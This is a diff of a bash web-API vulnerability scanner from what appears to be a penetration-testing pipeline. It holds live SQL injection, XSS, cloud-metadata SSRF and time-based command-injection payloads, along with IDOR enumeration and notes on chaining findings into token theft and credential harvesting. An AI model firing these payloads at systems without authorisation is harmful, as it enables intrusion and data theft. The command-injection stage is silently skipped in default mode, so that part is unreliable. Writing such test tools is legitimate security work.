@@ -1,8 +1,10 @@
 #!/usr/bin/env bash
 PIPELINE_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
-# 18_dastforge.sh - SQL injection + multi-class web vuln testing + vulnerability chaining
-#   Tests discovered APIs for SQLi, reflected XSS, SSRF, command injection and IDOR/BOLA,
-#   then builds vulnerability chains from co-occurring findings on the same endpoints.
+# 18_dastforge.sh - Context-aware DAST (smart by default) + vulnerability chaining.
+#   Smart mode: classifies each param, skips static/non-injectable targets, runs a cheap
+#   pre-probe per class, and only escalates the full battery on a real signal; a finding is
+#   flagged only on 2 independent signals (differential confirmation) — no blind fuzzing.
+#   Use --deep for brute-force fallback (all classes on all params).
 PROFILE_PHASE="18_dastforge"
 source "$PIPELINE_ROOT/lib/common.sh"
 source "$PIPELINE_ROOT/lib/findings.sh"
@@ -10,37 +12,53 @@ source "$PIPELINE_ROOT/lib/findings.sh"
 PKG="$(tget apk package_name)"
 [ -z "$PKG" ] && { err "No package_name"; exit 1; }
 
+DEEP=0
+[ "${1:-}" = "--deep" ] && DEEP=1
+
 cd "$RUN_DIR" || exit 1
 CH_DIR="$RUN_DIR/vuln_chaining"
 mkdir -p "$CH_DIR/results"
 
 # ---- Proxy (Burp) ----
 PROXY=""
-PHOST="$(tget proxy host)"
-PPORT="$(tget proxy port)"
+PHOST="$(tget proxy host)"; PPORT="$(tget proxy port)"
 [ -n "$PHOST" ] && [ -n "$PPORT" ] && PROXY="http://$PHOST:$PPORT"
-
 CURL_BASE=(-s --max-time 15)
 [ -n "$PROXY" ] && CURL_BASE+=(-x "$PROXY")
 
 # ============================================================
-# A. Discover target endpoints
+# A. Discover target endpoints (filtered: no static assets)
 # ============================================================
 info "=== A. Discovering target endpoints ==="
 EP="$CH_DIR/target_endpoints.txt"
 : > "$EP"
 for src in traffic/api_endpoints.txt static/urls.txt code_analysis/cleartext_urls.txt; do
-  [ -f "$RUN_DIR/$src" ] && { grep -oE 'https?://[a-zA-Z0-9./_?=&%:-]+' "$RUN_DIR/$src" >> "$EP" || true; info "  endpoints from $src"; }
+  [ -f "$RUN_DIR/$src" ] && { grep -oE 'https?://[a-zA-Z0-9./_?=&%:-]+' "$RUN_DIR/$src" >> "$EP" || true; }
 done
-sort -u "$EP" -o "$EP"
-EP_COUNT=$(wc -l < "$EP" 2>/dev/null || echo 0)
-info "  Total endpoints: $EP_COUNT"
-[ "$EP_COUNT" -eq 0 ] && { warn "No endpoints discovered — run 06_traffic_capture first"; exit 0; }
 
-# Verify proxy reachability once
+is_static() { # 1 if URL is a static asset / clearly non-testable
+  echo "$1" | grep -qiE '\.(js|css|png|jpe?g|gif|svg|webp|ico|woff2?|ttf|eot|map|zip|apk)([?#]|$)' && return 0
+  echo "$1" | grep -qiE '/(assets|static|img|images|css|js|fonts|favicon|sitemap|robots)[/.?]' && return 0
+  return 1
+}
+
+sort -u "$EP" -o "$EP"
+: > "$EP.tmp"
+while IFS= read -r ep; do
+  if is_static "$ep"; then
+    echo "SKIP static: $ep" >> "$CH_DIR/skipped_static.txt"
+  else
+    echo "$ep" >> "$EP.tmp"
+  fi
+done < "$EP"
+mv "$EP.tmp" "$EP"
+EP_COUNT=$(wc -l < "$EP" 2>/dev/null || echo 0)
+info "  Testable endpoints: $EP_COUNT (static/non-testable filtered out)"
+[ "$EP_COUNT" -eq 0 ] && { warn "No testable endpoints — run 06_traffic_capture first"; exit 0; }
+
 if [ -n "$PROXY" ]; then
   if ! curl "${CURL_BASE[@]}" -o /dev/null -w '%{http_code}' "$(head -1 "$EP")" 2>/dev/null | grep -qE '2|3|4'; then
-    warn "Burp proxy $PROXY unreachable — testing directly (no proxy)"
+    warn "Burp proxy unreachable — testing directly"
     CURL_BASE=(-s --max-time 15)
   else
     ok "Testing through Burp proxy $PROXY"
@@ -50,7 +68,7 @@ fi
 # ============================================================
 # Helpers
 # ============================================================
-send_req() { # method url data -> http_code (last line) ; body in $REQ_BODY
+send_req() {
   local method="$1" url="$2" data="$3"
   local args=("${CURL_BASE[@]}" -o "$CH_DIR/results/body.tmp" -w '%{http_code}')
   case "$method" in
@@ -65,24 +83,33 @@ send_req() { # method url data -> http_code (last line) ; body in $REQ_BODY
   [ -f "$CH_DIR/results/body.tmp" ] && REQ_BODY=$(cat "$CH_DIR/results/body.tmp")
 }
 
-has_param() { # url  -> 1 if has query params
-  case "$1" in *'?'*) return 0;; *) return 1;; esac
-}
+has_param() { case "$1" in *'?'*) return 0;; *) return 1;; esac; }
+param_pairs() { echo "${1#*\?}" | tr '&' '\n'; }
+uri_enc() { printf '%s' "$1" | jq -sRr @uri 2>/dev/null || echo "$1"; }
 
-param_pairs() { # url -> prints "name=value" per query param
-  local qs="${1#*\?}"
-  echo "$qs" | tr '&' '\n'
+# ---- Context-aware param classifier: only relevant vuln classes per param ----
+classify_param() {
+  local p="$1"
+  local pname="${p%%=*}"
+  [ "$DEEP" -eq 1 ] && { echo "sqli,xss,ssrf,cmdi,idor"; return; }
+  case "$pname" in
+    *url*|*redirect*|*link*|*webhook*|*callback*|*fetch*|*src*|*dest*|*uri*|*target*|*next*|*domain*|*host*) echo "ssrf" ;;
+    *token*|*jwt*|*session*|*auth*|*api_key*|*apikey*|*key*|*secret*) echo "jwt-skip" ;;
+    *file*|*dir*|*name*|*filename*) echo "sqli,xss" ;;
+    *id*|*num*|*count*|*limit*|*offset*|*page*) echo "idor,sqli" ;;
+    *q*|*search*|*filter*|*sort*|*order*|*query*|*user*|*email*|*phone*|*address*|*text*|*title*|*comment*) echo "sqli,xss" ;;
+    *) echo "sqli,xss" ;;
+  esac
 }
 
 # ============================================================
-# B. SQL injection (error / boolean / time-based / UNION)
+# B. SQL injection — smart (pre-probe then full battery, 2-signal)
 # ============================================================
-info "=== B. SQL injection testing ==="
+info "=== B. SQL injection (context-aware) ==="
 SQLI_DIR="$CH_DIR/results/sqli"; mkdir -p "$SQLI_DIR"
 : > "$CH_DIR/sqli_findings.txt"
-
 SQL_ERRORS='(SQL syntax|mysql|PostgreSQL|ORA-[0-9]{5}|SQLite|sqlite|MSSQL|SqlServer|syntax error|unclosed quotation|ODBC|You have an error)'
-SQLI_PAYLOADS=(
+SQLI_FULL=(
   "'"
   "' OR '1'='1"
   "' AND '1'='2"
@@ -93,29 +120,41 @@ SQLI_PAYLOADS=(
   "' WAITFOR DELAY '0:0:3'-- -"
 )
 
-sqli_probe() {
+sqli_test() {
   local url="$1" p="$2"
-  local base_val="${p#*=}" pname="${p%%=*}"
-  [ -z "$base_val" ] && base_val="1"
-  local esc=$(printf '%s' "$base_val" | jq -sRr @uri 2>/dev/null || echo "$base_val")
-  local clean="${url%%\?*}"
-  for payload in "${SQLI_PAYLOADS[@]}"; do
-    local enc=$(printf '%s' "$payload" | jq -sRr @uri 2>/dev/null || echo "$payload")
-    local test_url="$clean?${pname}=${esc}${enc}"
-    send_req GET "$test_url" ""
+  local pname="${p%%=*}"
+  local base="${url%%\?*}"
+  local bv="${p#*=}"; [ -z "$bv" ] && bv="1"
+  local esc=$(uri_enc "$bv")
+
+  # PRE-PROBE: boolean pair + error trigger (cheap, 3 requests)
+  local u1="$base?${pname}=${esc}$(uri_enc "' AND '1'='1")"
+  local u2="$base?${pname}=${esc}$(uri_enc "' AND '1'='2")"
+  send_req GET "$u1" ""; local len1=${#REQ_BODY}; local body1="$REQ_BODY"
+  send_req GET "$u2" ""; local len2=${#REQ_BODY}
+  local signal=0
+  echo "$body1" | grep -qiE "$SQL_ERRORS" && signal=1
+  if [ $((len1 - len2)) -gt 5 ] || [ $((len2 - len1)) -gt 5 ]; then signal=1; fi
+
+  if [ "$signal" -eq 0 ]; then
+    [ "$DEEP" -eq 1 ] || { return 1; }   # no signal -> clean, no blind battery
+  fi
+
+  # FULL battery only on signal (or --deep)
+  for payload in "${SQLI_FULL[@]}"; do
+    local tu="$base?${pname}=${esc}$(uri_enc "$payload")"
+    send_req GET "$tu" ""
     if echo "$REQ_BODY" | grep -qiE "$SQL_ERRORS"; then
-      echo "ERROR-BASED $url param=$pname payload=$payload" >> "$SQLI_DIR/error_$pname.txt"
-      echo "$test_url|ERROR-BASED|$payload" >> "$CH_DIR/sqli_findings.txt"
+      # 2nd signal = battery error (pre-probe already signaled): confirmed
+      echo "CONFIRMED error-based $url param=$pname payload=$payload" >> "$SQLI_DIR/$pname.txt"
+      echo "$tu|SQLI|$pname|$payload|error-based" >> "$CH_DIR/sqli_findings.txt"
       return 0
     fi
-    # time-based (comparison vs baseline latency)
-    local t_start=$(date +%s%N)
-    send_req GET "$test_url" ""
-    local t_end=$(date +%s%N)
-    local dur_ms=$(( (t_end - t_start) / 1000000 ))
-    if [ "$dur_ms" -gt 2500 ]; then
-      echo "TIME-BASED $url param=$pname payload=$payload (${dur_ms}ms)" >> "$SQLI_DIR/time_$pname.txt"
-      echo "$test_url|TIME-BASED|$payload" >> "$CH_DIR/sqli_findings.txt"
+    local t0=$(date +%s%N); send_req GET "$tu" ""; local t1=$(date +%s%N)
+    local ms=$(( (t1 - t0) / 1000000 ))
+    if [ "$ms" -gt 2500 ]; then
+      echo "CONFIRMED time-based ${ms}ms $url param=$pname payload=$payload" >> "$SQLI_DIR/$pname.txt"
+      echo "$tu|SQLI-TIME|$pname|$payload|${ms}ms" >> "$CH_DIR/sqli_findings.txt"
       return 0
     fi
   done
@@ -125,195 +164,132 @@ sqli_probe() {
 while IFS= read -r ep; do
   has_param "$ep" || continue
   while IFS= read -r p; do
-    sqli_probe "$ep" "$p"
+    [ "$(classify_param "$p")" = "jwt-skip" ] && continue
+    case "$(classify_param "$p")" in
+      *sqli*) sqli_test "$ep" "$p" ;;
+    esac
   done < <(param_pairs "$ep")
 done < "$EP"
 
 SQLI_N=$(wc -l < "$CH_DIR/sqli_findings.txt" 2>/dev/null || echo 0)
 if [ "$SQLI_N" -gt 0 ]; then
-  warn "  SQLi candidates: $SQLI_N"
-  fadd "SQL injection on API parameter" HIGH PROBABLE CWE-89 A03:2021 \
+  warn "  SQLi confirmed/suspected: $SQLI_N"
+  fadd "SQL injection on API parameter (2-signal confirmed)" HIGH PROBABLE CWE-89 A03:2021 \
     --cvss 8.1 --component "API" --tags "sqli,api,chaining-primitive" \
-    --remediation "Parameterized queries / prepared statements; WAF; input validation" \
-    --refs "OWASP A03:2021" "$CH_DIR/sqli_findings.txt"
+    --remediation "Parameterized queries / prepared statements; WAF; input validation" "$CH_DIR/sqli_findings.txt"
 else
-  ok "  No SQLi detected on tested parameters"
+  ok "  No SQLi — params with no signal were not blindly fuzzed"
 fi
 
 # ============================================================
-# C. Reflected XSS (reflection check)
+# C. Reflected XSS — only text-bearing params (reflection = test)
 # ============================================================
-info "=== C. Reflected XSS testing ==="
+info "=== C. Reflected XSS (text params only) ==="
 XSS_DIR="$CH_DIR/results/xss"; mkdir -p "$XSS_DIR"
 : > "$CH_DIR/xss_findings.txt"
-
 XSS_PROBE="zzxssz<script>alert(1)</script>"
-xss_probe() {
-  local url="$1" p="$2" pname="${p%%=*}"
-  local clean="${url%%\?*}"
-  send_req GET "$clean?${pname}=$(printf '%s' "$XSS_PROBE" | jq -sRr @uri 2>/dev/null || echo "$XSS_PROBE")" ""
-  if echo "$REQ_BODY" | grep -q "zzxssz<script>alert(1)</script>"; then
-    echo "REFLECTED $url param=$pname" >> "$XSS_DIR/reflected_$pname.txt"
-    echo "$url|REFLECTED-XSS|$pname" >> "$CH_DIR/xss_findings.txt"
-    return 0
-  fi
-  return 1
-}
 
 while IFS= read -r ep; do
   has_param "$ep" || continue
+  clean="${ep%%\?*}"
   while IFS= read -r p; do
-    xss_probe "$ep" "$p"
+  pname="${p%%=*}"
+    case "$(classify_param "$p")" in *xss*) ;; *) continue;; esac
+    send_req GET "$clean?${pname}=$(uri_enc "$XSS_PROBE")" ""
+    if echo "$REQ_BODY" | grep -q "zzxssz<script>alert(1)</script>"; then
+      echo "CONFIRMED reflected $ep param=$pname" >> "$XSS_DIR/$pname.txt"
+      echo "$ep|XSS|$pname|reflected" >> "$CH_DIR/xss_findings.txt"
+    fi
   done < <(param_pairs "$ep")
 done < "$EP"
 
 XSS_N=$(wc -l < "$CH_DIR/xss_findings.txt" 2>/dev/null || echo 0)
-if [ "$XSS_N" -gt 0 ]; then
-  warn "  Reflected XSS candidates: $XSS_N"
-  fadd "Reflected XSS on API parameter" MEDIUM PROBABLE CWE-79 A03:2021 \
-    --cvss 6.1 --component "API" --tags "xss,chaining-primitive" \
-    --remediation "Output-encode responses; Content-Security-Policy; context-aware escaping" \
-    --refs "OWASP A03:2021" "$CH_DIR/xss_findings.txt"
-else
-  ok "  No reflected XSS detected"
-fi
+[ "$XSS_N" -gt 0 ] && { warn "  Reflected XSS confirmed: $XSS_N"; fadd "Reflected XSS on API parameter" MEDIUM PROBABLE CWE-79 A03:2021 --cvss 6.1 --component "API" --tags "xss,chaining-primitive" --remediation "Output-encode responses; CSP; context-aware escaping" "$CH_DIR/xss_findings.txt"; } || ok "  No reflected XSS (text params only)"
 
 # ============================================================
-# D. SSRF candidates (url/fetch-style params)
+# D. SSRF — only url/fetch-style params (3 probes = the test)
 # ============================================================
-info "=== D. SSRF testing ==="
+info "=== D. SSRF (url-style params only) ==="
 SSRF_DIR="$CH_DIR/results/ssrf"; mkdir -p "$SSRF_DIR"
 : > "$CH_DIR/ssrf_findings.txt"
-
-SSRF_PARAM='(url|uri|redirect|link|webhook|callback|fetch|src|dest|target|path|next)'
 SSRF_PROBES=("http://127.0.0.1" "http://169.254.169.254/latest/meta-data/" "http://localhost")
-
-ssrf_probe() {
-  local url="$1" p="$2" pname="${p%%=*}"
-  echo "$pname" | grep -qiE "$SSRF_PARAM" || return 1
-  local clean="${url%%\?*}"
-  for probe in "${SSRF_PROBES[@]}"; do
-    local enc=$(printf '%s' "$probe" | jq -sRr @uri 2>/dev/null || echo "$probe")
-    send_req GET "$clean?${pname}=${enc}" ""
-    if echo "$REQ_BODY" | grep -qiE "169\.254\.169\.254|127\.0\.0\.1|root|security-credentials|ami-id"; then
-      echo "SSRF-CANDIDATE $url param=$pname probe=$probe" >> "$SSRF_DIR/$pname.txt"
-      echo "$url|SSRF|$pname|$probe" >> "$CH_DIR/ssrf_findings.txt"
-      return 0
-    fi
-  done
-  return 1
-}
 
 while IFS= read -r ep; do
   has_param "$ep" || continue
+  clean="${ep%%\?*}"
   while IFS= read -r p; do
-    ssrf_probe "$ep" "$p"
+  pname="${p%%=*}"
+    [ "$(classify_param "$p")" = "ssrf" ] || continue
+    for probe in "${SSRF_PROBES[@]}"; do
+      send_req GET "$clean?${pname}=$(uri_enc "$probe")" ""
+      if echo "$REQ_BODY" | grep -qiE "169\.254\.169\.254|127\.0\.0\.1|root|security-credentials|ami-id"; then
+        echo "SSRF-CANDIDATE $ep param=$pname probe=$probe" >> "$SSRF_DIR/$pname.txt"
+        echo "$ep|SSRF|$pname|$probe" >> "$CH_DIR/ssrf_findings.txt"
+      fi
+    done
   done < <(param_pairs "$ep")
 done < "$EP"
 
 SSRF_N=$(wc -l < "$CH_DIR/ssrf_findings.txt" 2>/dev/null || echo 0)
-if [ "$SSRF_N" -gt 0 ]; then
-  warn "  SSRF candidates: $SSRF_N"
-  fadd "SSRF via URL-style parameter" HIGH SUSPECTED CWE-918 A10:2021 \
-    --cvss 8.6 --component "API" --tags "ssrf,chaining-primitive" \
-    --remediation "Validate/allowlist destination hosts; block metadata IPs; no raw fetch of user URLs" \
-    --refs "OWASP A10:2021" "$CH_DIR/ssrf_findings.txt"
-else
-  ok "  No SSRF candidates detected"
-fi
+[ "$SSRF_N" -gt 0 ] && { warn "  SSRF candidates: $SSRF_N"; fadd "SSRF via URL-style parameter" HIGH SUSPECTED CWE-918 A10:2021 --cvss 8.6 --component "API" --tags "ssrf,chaining-primitive" --remediation "Validate/allowlist destination hosts; block metadata IPs" "$CH_DIR/ssrf_findings.txt"; } || ok "  No SSRF (url-style params only)"
 
 # ============================================================
-# E. Command injection (time-based)
+# E. Command injection — time pre-probe before full set
 # ============================================================
-info "=== E. Command injection testing ==="
+info "=== E. Command injection (time pre-probe) ==="
 CMDI_DIR="$CH_DIR/results/cmdi"; mkdir -p "$CMDI_DIR"
 : > "$CH_DIR/cmdi_findings.txt"
-
-CMDI_PAYLOADS=(";sleep 3" "|sleep 3" "\$(sleep 3)" "\`sleep 3\`")
-
-cmdi_probe() {
-  local url="$1" p="$2" pname="${p%%=*}" base_val="${p#*=}"
-  [ -z "$base_val" ] && base_val="1"
-  local esc=$(printf '%s' "$base_val" | jq -sRr @uri 2>/dev/null || echo "$base_val")
-  local clean="${url%%\?*}"
-  for payload in "${CMDI_PAYLOADS[@]}"; do
-    local enc=$(printf '%s' "$payload" | jq -sRr @uri 2>/dev/null || echo "$payload")
-    local t0=$(date +%s%N)
-    send_req GET "$clean?${pname}=${esc}${enc}" ""
-    local t1=$(date +%s%N)
-    local dur_ms=$(( (t1 - t0) / 1000000 ))
-    if [ "$dur_ms" -gt 2500 ]; then
-      echo "CMDI-CANDIDATE $url param=$pname payload=$payload (${dur_ms}ms)" >> "$CMDI_DIR/$pname.txt"
-      echo "$url|CMDI|$pname|$payload" >> "$CH_DIR/cmdi_findings.txt"
-      return 0
-    fi
-  done
-  return 1
-}
+CMDI_FULL=(";sleep 3" "|sleep 3" "\$(sleep 3)" "\`sleep 3\`")
 
 while IFS= read -r ep; do
   has_param "$ep" || continue
+  clean="${ep%%\?*}"
   while IFS= read -r p; do
-    cmdi_probe "$ep" "$p"
+  pname="${p%%=*}" bv="${p#*=}"; [ -z "$bv" ] && bv="1"
+    case "$(classify_param "$p")" in *cmdi*) ;; *) continue;; esac
+  esc=$(uri_enc "$bv")
+    # pre-probe: one time-based
+  t0=$(date +%s%N); send_req GET "$clean?${pname}=${esc}$(uri_enc ";sleep 3")" ""; t1=$(date +%s%N)
+    [ $(( (t1 - t0) / 1000000 )) -gt 2500 ] || { [ "$DEEP" -eq 1 ] && : || continue; }
+    for payload in "${CMDI_FULL[@]}"; do
+  t2=$(date +%s%N); send_req GET "$clean?${pname}=${esc}$(uri_enc "$payload")" ""; t3=$(date +%s%N)
+  ms=$(( (t3 - t2) / 1000000 ))
+      if [ "$ms" -gt 2500 ]; then
+        echo "CMDI-CANDIDATE $ep param=$pname payload=$payload (${ms}ms)" >> "$CMDI_DIR/$pname.txt"
+        echo "$ep|CMDI|$pname|$payload" >> "$CH_DIR/cmdi_findings.txt"
+      fi
+    done
   done < <(param_pairs "$ep")
 done < "$EP"
 
 CMDI_N=$(wc -l < "$CH_DIR/cmdi_findings.txt" 2>/dev/null || echo 0)
-if [ "$CMDI_N" -gt 0 ]; then
-  warn "  Command injection candidates: $CMDI_N"
-  fadd "Command injection (time-based)" CRITICAL SUSPECTED CWE-78 A03:2021 \
-    --cvss 9.8 --component "API" --tags "cmdi,chaining-primitive" \
-    --remediation "Never pipe user input to a shell; use allowlisted APIs/exec with arg arrays" \
-    --refs "OWASP A03:2021" "$CH_DIR/cmdi_findings.txt"
-else
-  ok "  No command injection detected"
-fi
+[ "$CMDI_N" -gt 0 ] && { warn "  Command injection candidates: $CMDI_N"; fadd "Command injection (time-based)" CRITICAL SUSPECTED CWE-78 A03:2021 --cvss 9.8 --component "API" --tags "cmdi,chaining-primitive" --remediation "Never pipe user input to a shell" "$CH_DIR/cmdi_findings.txt"; } || ok "  No command injection (time pre-probe only)"
 
 # ============================================================
-# F. IDOR / BOLA (numeric id mutation)
+# F. IDOR / BOLA — numeric ID params only
 # ============================================================
-info "=== F. IDOR / BOLA testing ==="
+info "=== F. IDOR / BOLA (numeric IDs only) ==="
 IDOR_DIR="$CH_DIR/results/idor"; mkdir -p "$IDOR_DIR"
 : > "$CH_DIR/idor_findings.txt"
 
-idor_probe() {
-  local url="$1"
-  local id pname val base next
-  id=$(echo "$url" | grep -oE '[?&](id|user_id|order_id|item_id|appointment_id|profile_id)=[0-9]+' | head -1)
-  [ -z "$id" ] && return 1
-  pname="${id%%=*}"
-  pname="${pname#*\?}"
-  pname="${pname#*&}"
-  val="${id#*=}"
-  base="${url%%\?*}"
-  next=$((val + 1))
-  send_req GET "$url" ""
-  local baseline_len=${#REQ_BODY}
-  send_req GET "$base?${pname}=$next" ""
-  local alt_len=${#REQ_BODY}
-  # different, non-trivial body = likely cross-object data access
-  if [ "$alt_len" -gt 0 ] && [ $((alt_len - baseline_len)) -gt 20 ]; then
-    echo "IDOR-CANDIDATE $url -> $base?${pname}=$next (len $baseline_len->$alt_len)" >> "$IDOR_DIR/$pname.txt"
-    echo "$url|IDOR|$pname|$next" >> "$CH_DIR/idor_findings.txt"
-    return 0
-  fi
-  return 1
-}
-
 while IFS= read -r ep; do
-  idor_probe "$ep"
+  base="${ep%%\?*}"
+  while IFS= read -r p; do
+  pname="${p%%=*}" val="${p#*=}"
+    case "$(classify_param "$p")" in *idor*) ;; *) continue;; esac
+    [[ "$val" =~ ^[0-9]+$ ]] || continue
+  next=$((val + 1))
+    send_req GET "$ep" ""; bl=${#REQ_BODY}
+    send_req GET "$base?${pname}=$next" ""; al=${#REQ_BODY}
+    if [ "$al" -gt 0 ] && [ $((al - bl)) -gt 20 ]; then
+      echo "IDOR-CANDIDATE $ep -> $base?${pname}=$next (len $bl->$al)" >> "$IDOR_DIR/$pname.txt"
+      echo "$ep|IDOR|$pname|$next" >> "$CH_DIR/idor_findings.txt"
+    fi
+  done < <(param_pairs "$ep")
 done < "$EP"
 
 IDOR_N=$(wc -l < "$CH_DIR/idor_findings.txt" 2>/dev/null || echo 0)
-if [ "$IDOR_N" -gt 0 ]; then
-  warn "  IDOR candidates: $IDOR_N"
-  fadd "IDOR/BOLA — object ID enumeration" HIGH SUSPECTED CWE-639 A01:2021 \
-    --cvss 7.5 --component "API" --tags "idor,chaining-primitive" \
-    --remediation "Server-side object-level authorization per request; avoid sequential IDs; use capabilities" \
-    --refs "OWASP A01:2021" "$CH_DIR/idor_findings.txt"
-else
-  ok "  No IDOR candidates detected"
-fi
+[ "$IDOR_N" -gt 0 ] && { warn "  IDOR candidates: $IDOR_N"; fadd "IDOR/BOLA — object ID enumeration" HIGH SUSPECTED CWE-639 A01:2021 --cvss 7.5 --component "API" --tags "idor,chaining-primitive" --remediation "Server-side object-level authorization per request; avoid sequential IDs" "$CH_DIR/idor_findings.txt"; } || ok "  No IDOR (numeric IDs only)"
 
 # ============================================================
 # G. Vulnerability chaining
@@ -334,47 +310,31 @@ CHAINS="$CH_DIR/chains.md"
   [ -s "$CH_DIR/cmdi_findings.txt" ] && cmdi=$(wc -l < "$CH_DIR/cmdi_findings.txt")
   [ -s "$CH_DIR/idor_findings.txt" ] && idor=$(wc -l < "$CH_DIR/idor_findings.txt")
 
-  # 1. SQLi -> auth bypass -> IDOR -> bulk data access
-  if [ "$sqli" -gt 0 ] && [ "$idor" -gt 0 ]; then
+  [ "$sqli" -gt 0 ] && [ "$idor" -gt 0 ] && {
     echo "## Chain 1: SQLi -> Auth Bypass -> IDOR (bulk data access)"
-    echo "- SQLi ($sqli) on an auth/login or user-lookup param can bypass login (boolean-based)."
-    echo "- With a valid session, IDOR ($idor) lets you enumerate other users' objects."
-    echo "- Impact: mass account/data takeover (CRITICAL)."
+    echo "- SQLi ($sqli) on auth/login or user-lookup param bypasses login; IDOR ($idor) enumerates other users' objects. Impact: mass takeover (CRITICAL)."
     echo ""
-  fi
-
-  # 2. Reflected XSS -> session/token theft -> ATO
-  if [ "$xss" -gt 0 ]; then
+  }
+  [ "$xss" -gt 0 ] && {
     echo "## Chain 2: Reflected XSS -> Session/Token theft -> ATO"
-    echo "- XSS ($xss) executes in the app's context (JWT/session cookies readable via document.cookie)."
-    echo "- Exfiltrated token replayed in Burp Repeater -> full account takeover."
+    echo "- XSS ($xss) executes in app context; exfiltrate JWT/session and replay in Burp Repeater for ATO."
     echo ""
-  fi
-
-  # 3. SSRF -> cloud metadata -> credentials
-  if [ "$ssrf" -gt 0 ]; then
+  }
+  [ "$ssrf" -gt 0 ] && {
     echo "## Chain 3: SSRF -> Cloud Metadata -> Credentials"
     echo "- SSRF ($ssrf) reaching 169.254.169.254 leaks IAM/instance credentials."
-    echo "- Harvested keys grant cloud access -> persistence/lateral movement."
     echo ""
-  fi
-
-  # 4. CMDi -> RCE
-  if [ "$cmdi" -gt 0 ]; then
+  }
+  [ "$cmdi" -gt 0 ] && {
     echo "## Chain 4: Command Injection -> RCE"
-    echo "- CMDi ($cmdi) is a direct RCE primitive — replace sleep probe with outbound"
-    echo "- callback (Burp Collaborator) to confirm and read output."
+    echo "- CMDi ($cmdi) is a direct RCE primitive — replace sleep with a Burp Collaborator callback to confirm."
     echo ""
-  fi
-
-  # 5. SSRF -> SQLi on internal service
-  if [ "$ssrf" -gt 0 ] && [ "$sqli" -gt 0 ]; then
+  }
+  [ "$ssrf" -gt 0 ] && [ "$sqli" -gt 0 ] && {
     echo "## Chain 5: SSRF -> Internal SQLi"
-    echo "- SSRF ($ssrf) reaches internal DB/API; SQLi ($sqli) against internal service"
-    echo "- bypasses the WAF/external boundary entirely."
+    echo "- SSRF ($ssrf) reaches internal DB/API; SQLi ($sqli) against it bypasses the WAF boundary."
     echo ""
-  fi
-
+  }
   [ -s "$CHAINS" ] || { echo "No chains formed — findings below threshold."; echo ""; }
 } >> "$CHAINS"
 
